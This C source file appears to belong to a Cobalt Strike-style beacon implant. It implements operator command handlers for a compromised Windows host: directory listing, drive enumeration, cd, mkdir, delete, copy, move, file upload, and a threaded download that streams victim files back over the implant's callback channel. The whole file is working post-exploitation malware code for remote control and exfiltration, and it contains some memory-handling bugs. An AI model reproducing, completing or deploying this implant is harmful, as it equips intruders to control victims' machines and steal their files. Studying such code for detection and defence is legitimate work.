#include "Command.h"
#include "File.h"
#include "Api.h"

wchar_t* convertToWideChar(char* input) {
    if (input == NULL) {
        return NULL;
    }
	// 第一次调用获取所需缓冲区大小
    int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
    if (len == 0) {
        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
        return NULL;
    }

    wchar_t* wideStr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (wideStr == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
        free(wideStr);
        return NULL;
    }

    return wideStr;
}

char* convertWideCharToUTF8(const wchar_t* wideStr) {
    if (!wideStr) {
        return NULL;
    }

    // 包含 \0
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
    if (utf8Len == 0) {
        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n", GetLastError());
        return NULL;
    }

    char* utf8Str = (char*)malloc(utf8Len);
    if (!utf8Str) {
		fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Len, NULL, NULL) == 0) {
        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n", GetLastError());
        free(utf8Str);
        return NULL;
    }

    return utf8Str;
}

/*
C:\Users\*
D    0    -    .
D    0    -    ..
D    0    2025/08/25 20:10:12    Documents
F    12345    2025/08/24 18:22:11    file.txt
*/

char* listDirectory(char* dirPathStr, size_t* dirPathStrLen) {
    if (!dirPathStr || !dirPathStrLen) {
        return NULL;
    }
    // 设置本地化（主要影响宽字符处理和时间格式）
    setlocale(LC_ALL, "");
    wchar_t* path = convertToWideChar(dirPathStr);
    if (!path) {
		fprintf(stderr, "convertToWideChar failed\n");
        return NULL;
	}
    struct _wfinddata_t file_info;
    intptr_t handle;
    size_t len = wcslen(path);

	// 去除路径末尾的 \ 或者 /
    if (len > 0 && (path[len - 1] == L'/' || path[len - 1] == L'\\')) {
        path[len - 1] = L'\0';
    }

    // 尝试打开目录，如果失败就默认搜索 C:\*。
    handle = _wfindfirst(path, &file_info);
    if (handle == -1L) {
        free(path);
        fprintf(stderr, "Unable to open directory: %ls\n", path);
        return NULL;
    }

    // 动态缓冲区
    size_t bufCap = 4096;
    size_t bufLen = 0;
    wchar_t* resultStr = (wchar_t*)malloc(bufCap * sizeof(wchar_t));
    if (!resultStr) {
        _findclose(handle);
        free(path);
        return NULL;
    }
    resultStr[0] = L'\0';

    // 加入目录路径
    APPEND_FMT(L"%s\n", path);

    // 强制加入 "." 和 ".."
    APPEND_FMT(L"D\t0\t-\t.\n");
    APPEND_FMT(L"D\t0\t-\t..\n");

    wchar_t timeString[MAX_TIME_STRING_LENGTH];
	// 遍历目录项
    do {
        if (wcscmp(file_info.name, L".") == 0 || wcscmp(file_info.name, L"..") == 0) {
            continue;
        }
        time_t modified_time = (time_t)file_info.time_write;
        struct tm* timeinfo = localtime(&modified_time);
        wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);

        // 目录
        if (file_info.attrib & _A_SUBDIR) {
            APPEND_FMT(L"D\t0\t%s\t%s\n", timeString, file_info.name);
        }
        // 文件
        else {
            APPEND_FMT(L"F\t%lld\t%s\t%s\n", file_info.size, timeString, file_info.name);
        }
    } while (_wfindnext(handle, &file_info) == 0);

    _findclose(handle);
    free(path);

    // 转成 UTF-8
    char* resultStrchar = convertWideCharToUTF8(resultStr);
    free(resultStr);

    if (resultStrchar) {
        *dirPathStrLen = strlen(resultStrchar);
    }
    else {
        *dirPathStrLen = 0;
    }

    return resultStrchar;
}

unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    formatp format;
    datap parser;
    int pendingRequest;

    char* path = (char*)malloc(MAX_FILENAME);
    if (!path) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
	memset(path, 0, MAX_FILENAME);

    BeaconDataParse(&parser, commandBuf, commandBuflen);
    pendingRequest = BeaconDataInt(&parser);
    BeaconDataStringCopySafe(&parser, path, MAX_FILENAME);

    BeaconFormatAlloc(&format, 0x800);
    BeaconFormatInt(&format, pendingRequest);

    // 表明首次进入 CmdFileBrowse
    if (!strncmp(path, "." SOURCE_DIRECTORY, MAX_FILENAME))
    {
        GetCurrentDirectoryA(MAX_FILENAME, path);
        strncat_s(path, MAX_FILENAME, SOURCE_DIRECTORY, strlen(SOURCE_DIRECTORY));
    }

    BeaconFormatPrintf(&format, "%s\n", path);

    // 列目录
    size_t dirPathStrLen = 0;
    char* result = listDirectory(path, &dirPathStrLen);
    if (!result) return NULL;
    
	BeaconFormatPrintf(&format, "%s", result);
    
	*msgLen = BeaconFormatLength(&format);
	unsigned char* postMsg = (unsigned char*)malloc(*msgLen + 1);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        BeaconFormatFree(&format);
        free(result);
        free(path);
		return NULL;
    }
	memcpy(postMsg, BeaconFormatOriginal(&format), *msgLen);
	postMsg[*msgLen] = '\0';

	BeaconFormatFree(&format);
    free(result);
    free(path);

    return postMsg;
}

unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen, unsigned char* mode) {
    // 数据结构如下：
    // fileNameLength(4 Bytes) | fileName(fileNameLenngth Bytes) | fileContent(rest Bytes)
    datap parser;
    FILE* file;

    char* fileName = (char*)malloc(sizeof(char) * 1024);
    if (!fileName) {
		fprintf(stderr, "Memory Allocation failed\n");
        return NULL;
    }

    BeaconDataParse(&parser, commandBuf, commandBuflen);
    if (!BeaconDataStringCopySafe(&parser, fileName, 1024)) {
		fprintf(stderr, "Failed to extract fileName from commandBuf\n");
        return NULL;
    }

	file = fopen(fileName, mode);
    if (file == INVALID_HANDLE_VALUE || file == NULL) {
        free(fileName);
		fprintf(stderr, "Failed to open file %s for writing. Error:%lu\n", fileName, GetLastError());
        return NULL;
    }

	fwrite(BeaconDataBuffer(&parser), 1, BeaconDataLength(&parser), file);

    const char* prefix = "[*] Upload Successfully! File Size:";
    char offsetStr[20];     
    // 将整数转换为字符串
    sprintf(offsetStr, "%zu", BeaconDataLength(&parser));
    unsigned char* postMsg = (unsigned char*)malloc(strlen(offsetStr) + strlen(prefix) + 1);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed for result\n");
        free(fileName);
        fclose(file);
		return NULL;
    }

    memcpy(postMsg, prefix, strlen(prefix));
    memcpy(postMsg + strlen(prefix), offsetStr, strlen(offsetStr));
    *msgLen = strlen(offsetStr) + strlen(prefix);
    postMsg[strlen(offsetStr) + strlen(prefix)] = '\0';

    free(fileName);
    fclose(file);
    return postMsg;
}

unsigned char* CmdDrives(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    datap parser;
    BeaconDataParse(&parser, commandBuf, commandBuflen);

    formatp formatp;
    BeaconFormatAlloc(&formatp, 128);

    int value = BeaconDataInt(&parser);
    BeaconFormatInt(&formatp, value);

    DWORD logicalDrives = GetLogicalDrives();
    BeaconFormatPrintf(&formatp, "%u", logicalDrives);

    *msgLen = BeaconFormatLength(&formatp);
    unsigned char* postMsg = (unsigned char*)malloc(BeaconFormatLength(&formatp) + 1);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    memcpy(postMsg, BeaconFormatOriginal(&formatp), BeaconFormatLength(&formatp));
    postMsg[BeaconFormatLength(&formatp)] = '\0';

    BeaconFormatFree(&formatp);

    return postMsg;
}

unsigned char* CmdPwd(size_t* msgLen) {
    // 获取缓冲区所需大小，包括'\0'
    DWORD size = GetCurrentDirectoryA(0, NULL); 

    if (size == 0) {
        fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n", GetLastError());
        return NULL;
    }

    char* lpcurrentPath = (char*)malloc(size + 1);
    if (!lpcurrentPath) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    memset(lpcurrentPath, 0, size + 1);

    // result 不包括'\0'
    DWORD resultLen = GetCurrentDirectoryA(size, lpcurrentPath);

    if (resultLen == 0 || resultLen > size) {
		fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n", GetLastError());
        free(lpcurrentPath);
        return NULL;
    }

    *msgLen = resultLen;
	lpcurrentPath[resultLen] = '\0';

    return lpcurrentPath;
}

unsigned char* CmdCd(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    char* targetWorkDirectory = (char*)malloc(commandBuflen + 1);
    if (!targetWorkDirectory) {
        fprintf(stderr, "Memory allocation failed\n");
        return  NULL;
    }
    memcpy(targetWorkDirectory, commandBuf, commandBuflen);
    targetWorkDirectory[commandBuflen] = '\0';
    if (!SetCurrentDirectoryA(targetWorkDirectory)) {
        printf("SetCurrentDirectoryA failed with error:%lu\n", GetLastError());
        free(targetWorkDirectory);
        return NULL;
    }

    const  char* prefix = "[*] Now work directory is ";

    unsigned char* postMsg = (unsigned char*)malloc(strlen(prefix) + commandBuflen + 1);

    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        free(targetWorkDirectory);
        return NULL;
    }

    memcpy(postMsg, prefix, strlen(prefix));
    memcpy(postMsg + strlen(prefix), targetWorkDirectory, commandBuflen);

    *msgLen = strlen(prefix) + commandBuflen;
    postMsg[strlen(prefix) + commandBuflen] = '\0';

    return postMsg;
}

unsigned char* CmdMkdir(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    datap parser;
    BeaconDataParse(&parser, commandBuf, commandBuflen);

    char* path = BeaconDataStringPointerCopy(&parser, 0x4000);

    _mkdir(path);

    char* preifx = "[*] Mkdir Success:";
    unsigned char* postMsg = (unsigned char*)malloc(strlen(preifx) + strlen(path) + 1);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    memcpy(postMsg, preifx, strlen(preifx));
    memcpy(postMsg + strlen(preifx), path, strlen(path));

    *msgLen = strlen(preifx) + strlen(path);
    postMsg[strlen(preifx) + strlen(path)] = '\0';

    return postMsg;
}

unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    datap parser;
    BeaconDataParse(&parser, commandBuf, commandBuflen);
    char* path = BeaconDataStringPointerCopy(&parser, 0x4000);

    DWORD attributes = GetFileAttributesA((LPCSTR)path);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "Removed target is not a directory or file\n");
        return NULL;
    }

    BOOL bRet;
    // 删除文件是目录的情况
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        bRet = RemoveDirectoryA((LPCSTR)path);
        if (!bRet) {
            fprintf(stderr, "RemoveDirectoryA failed with error:%lu\n", GetLastError());
            return NULL;
        }
    }
    // 文件
    else {
        bRet = DeleteFileA((LPCSTR)path);
        if (!bRet) {
            fprintf(stderr, "DeleteFileA failed with error:%lu\n", GetLastError());
            return NULL;
        }
    }

    char* prefix = bRet == FALSE ? "[*] rm failed: " : "[*] rm successfully: ";
    size_t prelength = strlen(prefix);
    size_t pathlength = strlen(path);

    *msgLen = prelength + pathlength;
    unsigned char* postMsg = (unsigned char*)malloc(prelength + pathlength + 1);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    memcpy(postMsg, prefix, prelength);
    memcpy(postMsg + prelength, path, pathlength);
    postMsg[*msgLen] = '\0';

    return postMsg;
}

DWORD WINAPI downloadThread(LPVOID lpParam) {
    Sleep(2000);
    struct FileThreadArgs* args = (struct FileThreadArgs*)lpParam;
    char* fileNameBuf = args->fileNameBuf;
    size_t fileNameBufLen = args->fileNameBufLen;
    LPCSTR lpFilePath = (LPCSTR)fileNameBuf;
    uint64_t fileLen64Val;
    uint32_t fileLen32Val;

    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    if (GetFileAttributesExA(lpFilePath, GetFileExInfoStandard, &fileInfo)) {
        LARGE_INTEGER largeFileSize;
        largeFileSize.LowPart = fileInfo.nFileSizeLow;
        largeFileSize.HighPart = fileInfo.nFileSizeHigh;
        // 64 位文件总大小
        fileLen64Val = largeFileSize.QuadPart;
        // 最多下载 4GB 的文件
		// 否则返回错误信息
        if (largeFileSize.QuadPart > UINT32_MAX) {
            const char* errorStr = "[-] The downloaded file is larger than 4GB";
			unsigned char* errorBuffer = (unsigned char*)malloc(strlen(errorStr) + 1);
            if (errorBuffer) {
                memcpy(errorBuffer, errorStr, strlen(errorStr));
                errorBuffer[strlen(errorStr)] = '\0';
                DataProcess(errorBuffer, strlen(errorBuffer), 0);
                free(errorBuffer);
                free(args->fileNameBuf);
                free(args);
                return FALSE;
            }
        }
		// 文件大小已经在 4GB 范围内了, 可以直接赋值
        fileLen32Val = (uint32_t)largeFileSize.QuadPart;
    }
    else {
        fprintf(stderr, "GetFileAttributesExA failed with error:%lu\n", GetLastError());
        free(args->fileNameBuf);
        free(args);
        return FALSE;
    }

    // 开始构造数据包 
    // 数据包格式: responseId(4 Bytes) | fileLen32Val(4 Bytes) | fileNameBuf(fileNameBufLen  Bytes)
    uint32_t requestId = (uint32_t)GenerateRandomInt(10000, 99999);
    formatp format;
    BeaconFormatAlloc(&format, MAX_POST_FILENAME + MAX_BUFFER);
    BeaconFormatInt(&format, requestId);
    BeaconFormatInt(&format, fileLen32Val);
    BeaconFormatAppend(&format, fileNameBuf, fileNameBufLen);

    DataProcess((unsigned char*)BeaconFormatOriginal(&format), BeaconFormatLength(&format), CALLBACK_FILE);
    
    BeaconFormatFree(&format);
    HANDLE hFile = CreateFileA(fileNameBuf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "CreateFileA failed with error:%lu\n", GetLastError());
        free(args->fileNameBuf);
        free(args);
        CloseHandle(hFile);
        return FALSE;
    }

    unsigned char* fileBuffer = (unsigned char*)malloc(MAX_DOWNLOAD_BUFFER);
    if (fileBuffer == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        free(args->fileNameBuf);
        free(args);
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    BeaconFormatAlloc(&format, MAX_PACKET + 4);
    // 数据包格式: requestId(4 Bytes) | fileBuffer
    while (TRUE) {
        BOOL bRet = ReadFile(hFile, fileBuffer, MAX_DOWNLOAD_BUFFER, &bytesRead, NULL);
        if (!bRet) {
            fprintf(stderr, "ReadFile failed with error: %lu\n", GetLastError());
            free(args->fileNameBuf);
            free(args);
            CloseHandle(hFile);
            break;
        }
        // 数据读取完了
        if (bytesRead == 0) {
            break;
        }

        // 构造数据包
        BeaconFormatReset(&format);
        BeaconFormatInt(&format, requestId);
        BeaconFormatAppend(&format, fileBuffer, bytesRead);

        DataProcess((unsigned char*)BeaconFormatOriginal(&format), BeaconFormatLength(&format), CALLBACK_FILE_WRITE);

        Sleep(50);
    }

    BeaconFormatFree(&format);
    free(fileBuffer);

    const char* prefix = "[*] Already download file: ";
    unsigned char* postMsg = (unsigned char*)malloc(strlen(prefix) + fileNameBufLen + 1);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        free(args->fileNameBuf);
        free(args);
        return FALSE;
    }

    memcpy(postMsg, prefix, strlen(prefix));
    memcpy(postMsg + strlen(prefix), args->fileNameBuf, fileNameBufLen);
    size_t msgLen = strlen(prefix) + fileNameBufLen;

    postMsg[msgLen] = '\0';

    DataProcess(postMsg, msgLen, CALLBACK_OUTPUT);

    free(args->fileNameBuf);
    free(args);
    CloseHandle(hFile);

    return TRUE;
}

VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    struct FileThreadArgs* args = (struct FileThreadArgs*)malloc(sizeof(struct FileThreadArgs));
    if (!args) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }

    args->fileNameBuf = (char*)malloc(commandBuflen + 1);
    if (!args->fileNameBuf) {
        fprintf(stderr, "Memory allocation failed\n");
        free(args);
        return;
    }
    datap parser;
    BeaconDataParse(&parser, commandBuf, commandBuflen);

    memcpy(args->fileNameBuf, BeaconDataPtr(&parser, commandBuflen), commandBuflen);
    args->fileNameBuf[commandBuflen] = '\0';
    args->fileNameBufLen = commandBuflen;

    DWORD attributes = INVALID_FILE_ATTRIBUTES;
    if (args->fileNameBuf) {
        attributes = GetFileAttributesA((LPCSTR)args->fileNameBuf);
    }

    // error
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "GetFileAttributesA failed with error:%lu\n", GetLastError());
        free(args);
        free(args->fileNameBuf);
        return;
    }

    // 目录
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        fprintf(stderr, "Unable to download directory\n");
        free(args);
        free(args->fileNameBuf);
        return;
    }

    HANDLE myThread = CreateThread(
        NULL,                       // 默认线程安全性
        0,                          // 默认堆栈大小
        downloadThread,           // 线程函数
        args,                       // 传递给线程函数的参数
        0,                          // 默认创建标志
        NULL);                      // 不存储线程ID

    if (myThread == NULL) {
        fprintf(stderr, "CreateThread failed with error: %lu\n", GetLastError());
        free(args);
        free(args->fileNameBuf);
        return;
    }

    CloseHandle(myThread);
}
unsigned char* CmdFileCopy(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    // 数据包格式：existingFileNameLength(4 Bytes) | existingFileName(existingFileName Bytes) | newFileNameLength(4 Bytes) | newFileName(newFileNameLength Bytes)
    datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
    char* existingFileName = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
    char* newFileName = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);

    datap parser;
    BeaconDataParse(&parser, commandBuf, commandBuflen);
    BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
    BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);

    if (!CopyFileA(existingFileName, newFileName, FALSE))
    {
        fprintf(stderr, "CopyFileA failed with error:%lu\n", GetLastError());
        BeaconDataFree(pdatap);
        return NULL;
    }

	const char* prefix = "[*] Copy file success: ";
    size_t totalLength = strlen(prefix) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
	unsigned char* postMsg = (unsigned char*)malloc(totalLength);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        BeaconDataFree(pdatap);
        return NULL;
    }
    memcpy(postMsg, prefix, strlen(prefix));
    memcpy(postMsg + strlen(prefix), existingFileName, strlen(existingFileName));
    memcpy(postMsg + strlen(prefix) + strlen(existingFileName), " -> ", strlen(" -> "));
    memcpy(postMsg + strlen(prefix) + strlen(existingFileName) + strlen(" -> "), newFileName, strlen(newFileName));

    postMsg[totalLength - 1] = '\0';
	*msgLen = totalLength - 1;

    BeaconDataFree(pdatap);

    return postMsg;
}

unsigned char* CmdFileMove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    // 数据包格式：existingFileNameLength(4 Bytes) | existingFileName(existingFileName Bytes) | newFileNameLength(4 Bytes) | newFileName(newFileNameLength Bytes)
	datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
    char* existingFileName = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
    char* newFileName = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);

    datap parser;
    BeaconDataParse(&parser, commandBuf, commandBuflen);
    BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
    BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);
    
    if (!MoveFileA(existingFileName, newFileName))
    {
        fprintf(stderr, "MoveFileA failed with error:%lu\n", GetLastError());
		BeaconDataFree(pdatap);
        return NULL;
    }

    const char* prefix = "[*] Move file success: ";
    size_t totalLength = strlen(prefix) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
    unsigned char* postMsg = (unsigned char*)malloc(totalLength);
    if (!postMsg) {
        fprintf(stderr, "Memory allocation failed\n");
        BeaconDataFree(pdatap);
        return NULL;
    }
    memcpy(postMsg, prefix, strlen(prefix));
    memcpy(postMsg + strlen(prefix), existingFileName, strlen(existingFileName));
    memcpy(postMsg + strlen(prefix) + strlen(existingFileName), " -> ", strlen(" -> "));
    memcpy(postMsg + strlen(prefix) + strlen(existingFileName) + strlen(" -> "), newFileName, strlen(newFileName));

	*msgLen = totalLength - 1;
	postMsg[totalLength - 1] = '\0';

	BeaconDataFree(pdatap);

    return postMsg;
}


